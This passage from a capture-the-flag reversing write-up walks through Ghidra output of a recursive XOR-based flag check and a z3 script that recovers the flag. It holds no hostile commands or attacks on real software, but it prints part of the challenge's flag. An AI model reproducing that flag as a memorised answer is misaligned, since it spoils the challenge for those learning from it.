      uVar2 = FUN_08049546(0xdeadb00b,0xdeadb00b,0xdeadb00b,0xdeadb00b,in_stack_00000014,
                           in_stack_00000018 + 1);
    }
    else {
      uVar2 = 0;
    }
  }
  else {
    uVar2 = 1;
  }
  return uVar2;
}
```

After fixing the function signature with Ghidra it becomes:

```c
bool FUN_08049546(int a,int b,int c,int d,char *user_input,int index) {
  bool chk;
  int userin_len;
  userin_len = strlen(user_input);
  if (index + 22U < (uint)userin_len) {
    if ((char)(user_input[index + 20] ^ (&key)[index]) == user_input[index + 21]) {
      chk = FUN_08049546(L'\xdeadb00b',-0x21524ff5,-0x21524ff5,-0x21524ff5,user_input,index + 1);
    }
    else {
      chk = false;
    }
  }
  else {
    chk = true;
  }
  return chk;
}
```

Ok this looks easy. `index` starts from zero. Every function call its incremented by one. The check performed every call compares `index`+22 against 33, which means that we'll have 11 loop iterations. For evey iteration the character at `index`+20 of the flag is XORed with `key` and compared with its follower. Since the XOR is invertible, I think that we can reverse the process to get back the original characters. Using z3:

```python
from z3 import Solver, BitVec, Z3Exception
from IPython import embed
from string import printable

flag1 = 'flag{packer-4a3-1337'
orig_key = b'\x0b\x4c\x0f\x00\x01\x16\x10\x07\x09\x38\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
key = []
for i in range(len(orig_key)):
    key.append(orig_key[i])

print('charset length: %s' % len(printable))
for char in printable:
    print('\ntrying with %s...' % char)

    flagchars = [BitVec('flag_' + str(i), 32) for i in range(20, 31)]
    s = Solver()

    for i in range(0, 10):
        s.add(flagchars[i] ^ key[i] == flagchars[i+1])
    s.add(flagchars[0] == ord(char))

    s.check()
    try:
        m = s.model()
    except Z3Exception:
        continue

    flag = []
    for char in flag1:
        flag.append(char)

    j = 0
    for el in m:
        flag.append(chr(m[flagchars[j]].as_long()))
        j += 1
    flag.append('}')
    print(''.join(flag))
#embed()
```

And with this we should be all set. 
